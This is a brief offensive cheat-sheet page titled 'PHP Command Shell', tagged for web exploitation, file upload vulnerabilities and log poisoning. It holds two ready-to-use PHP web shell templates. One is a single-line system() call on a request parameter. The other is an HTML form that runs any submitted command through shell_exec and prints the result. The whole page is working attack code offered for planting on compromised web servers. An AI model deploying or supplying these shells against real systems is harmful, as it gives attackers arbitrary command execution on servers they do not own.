---
title: "PHP Command Shell"
date: 2025-7-16
tags: ["Reverse Shell", "Php", "Shell", "Template", "Web Exploitation", "File Upload Vulnerability", "Log Poisoning"]
---

### Template #1

```php
<?php system($_REQUEST['cmd']); ?>
```

---

### Template #2

```php
<!DOCTYPE html>
<html>
<head>
    <title>Command Shell</title>
    <style>
        body { font-family: monospace; margin: 20px; }
        pre { background: #f4f4f4; padding: 10px; }
    </style>
</head>
<body>
    <form method="GET" action="<?php echo htmlspecialchars(basename($_SERVER['PHP_SELF'])); ?>">
        <input type="text" name="cmd" autofocus>
        <input type="submit" value="Run">
    </form>
    <pre>
<?php
if (isset($_GET['cmd'])) {
    $cmd = trim($_GET['cmd']);
    if (!empty($cmd)) {
        echo htmlspecialchars(shell_exec($cmd . ' 2>&1'), ENT_QUOTES, 'UTF-8');
    }
}
?>
    </pre>
</body>
</html>
```